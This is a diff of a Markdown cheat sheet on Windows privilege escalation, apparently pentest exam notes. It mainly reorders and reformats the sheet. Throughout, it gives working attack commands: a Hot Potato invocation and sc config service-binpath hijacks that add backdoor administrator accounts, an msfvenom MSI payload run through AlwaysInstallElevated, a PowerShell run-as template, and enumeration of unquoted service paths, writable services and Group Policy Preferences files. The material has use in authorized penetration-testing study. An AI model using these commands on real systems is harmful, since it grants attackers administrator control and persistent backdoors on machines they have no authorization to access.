@@ -1,67 +1,47 @@
-THIS FILE IS ABOUT WINDOWS PRIV-ESC WITH DIFFERENT METHODS 
-Command | Description - SRC =https://paper.dropbox.com/doc/OSCP-Methodology-EnVX7VSiNGZ2K2QxCZD7Q 
+https://paper.dropbox.com/doc/OSCP-Methodology-EnVX7VSiNGZ2K2QxCZD7Q 
 ------------------
 https://github.com/LennonCMJ/pentest_script/blob/master/WindowsPE.md 
 
-# Run the famous JollyKatz enumeration script. Work through the results. 
-I prefer this as it’s not as much of a information overload as the other enumeration scripts.
-===========================
-http://rynudus.blogspot.com/2011/10/sql-ninja.html
-        
-# Does it run SQL?
-============================
-tasklist /fi "USERNAME ne NT AUTHORITY\SYSTEM" /fi "STATUS eq running"
-
+# sysinfo 
+~~~
+systeminfo
+~~~
 # Any services running as SYSTEM?
-===========================
-$username = 'user' 
-$password = 'password' 
-
-$securePassword = ConvertTo-SecureString $password -AsPlainText -Force 
-
-$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword 
-
-Start-Process <your evil bizz here> -Credential $credential 
-
-# Powershell script to run-as
-===============================
+~~~        
+tasklist /fi "USERNAME ne NT AUTHORITY\SYSTEM" /fi "STATUS eq running"
+~~~
+# If Windows > 2008 check the Group Policy Preferences.
+~~~
 \\REMOTE_HOST\SYSVOL\REMOTE_HOST\Policies\{POLICY_ID}\Machine\Preferences\ 
 The following configuration files may be present: 
-
 - Services\Services.xml 
 - ScheduledTasks\ScheduledTasks.xml 
 - Printers\Printers.xml 
 - Drives\Drives.xml 
 - DataSources\DataSources.xml
-
-# If Windows > 2008 check the Group Policy Preferences.
 https://memorycorruption.org/windows/2018/07/29/Notes-On-Windows-Privilege-Escalation.html  
-==============================
-Potato.exe -ip 127.0.0.1 -cmd "net user tater Winter2016 /add && net localgroup administrators tater /add" -disable_exhaust true
-
+~~~
 # Check if the hot potato exploit can be used.
-
-https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075
-
+~~~
+Potato.exe -ip 127.0.0.1 -cmd "net user tater Winter2016 /add && net localgroup administrators tater /add" -disable_exhaust true
 https://github.com/breenmachine/RottenPotatoNG
-==================================
+~~~
+# Check to exploit trusted service paths. 
+~~~
 wmic service get 
 name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """ 
 wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows\\" |findstr /i /v """ 
-
 icacls "C:\Program Files (x86)\Privacyware"
-
-# Check to exploit trusted service paths. 
 1. List all unquoted service paths.
 2- Check folder permissions on results. Look for M (modify) or W (write) for current user. 
-====================================
+~~~
+# Check to exploit vulnerable services. 
+# Accesscheck will determine which service bin paths can be modified.
+~~~
 Check:
 accesschk.exe -uwcqv  "Authenticated Users" c:\*  /accepteula 
-
 accesschk.exe -qwsu "Authenticated Users" c:\*
-
 sc qc <SERVICE_NAME>
-
 Exploit:
 sc config upnphost  binpath= "net localgroup Administrators backdoora /add" depend= "" 
 
@@ -69,8 +49,6 @@ sc config upnphost  obj= ".\LocalSystem" password= ""
 binpath= "net localgroup Administrators backdoora /add" 
 
 sc config upnphost  obj= ".\LocalSystem" password= "" 
-
-# Check to exploit vulnerable services. Accesscheck will determine which service bin paths can be modified.
 
 Then we can use sc qc to determine the properties, you want to look for the following listed below.
 Look for:
@@ -84,24 +62,22 @@ Look for:
 
 https://www.gracefulsecurity.com/privesc-insecure-service-permissions/ 
 https://labs.mwrinfosecurity.com/assets/BlogFiles/mwri-windows-services-all-roads-lead-to-system-whitepaper.pdf
-============================
+~~~
+# Is elevated installations enabled on the server? We can exploit that.
+~~~
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 
-
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-
+~~~
+# Use MSFvenom to create msi exploit. 
+~~~
 msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o rotten.msi
-
-msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\rotten.msi
-        
-# Is always elevated installations enabled on the server? We can exploit that.
-
+msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\rotten.msi     
 First check the registry, both must be set to 1.
-
-Use MSFvenom to create msi exploit. 
-=============================
-for %a in ("%path:;=";"%") do accesschk.exe  /accepteula -dqv "%~a"
-
+~~~
 # %PATH% exploit.
+~~~
+for %a in ("%path:;=";"%") do accesschk.exe  /accepteula -dqv "%~a"
+~~~
 ============================
 / What system are we connected to? 
 systeminfo | findstr /B /C:"OS Name" /C:"OS Version" 
@@ -194,6 +170,6 @@ Local Privilege Escalation from Windows Service Accounts to SYSTEM
 https://github.com/PowerShellMafia/PowerSploit
 PowerSploit - A PowerShell Post-Exploitation Framework
 
-#Other nice write-ups for windows priv-esc 
+# Other nice write-ups for windows priv-esc 
 https://toshellandback.com/2015/11/24/ms-priv-esc/
 https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/
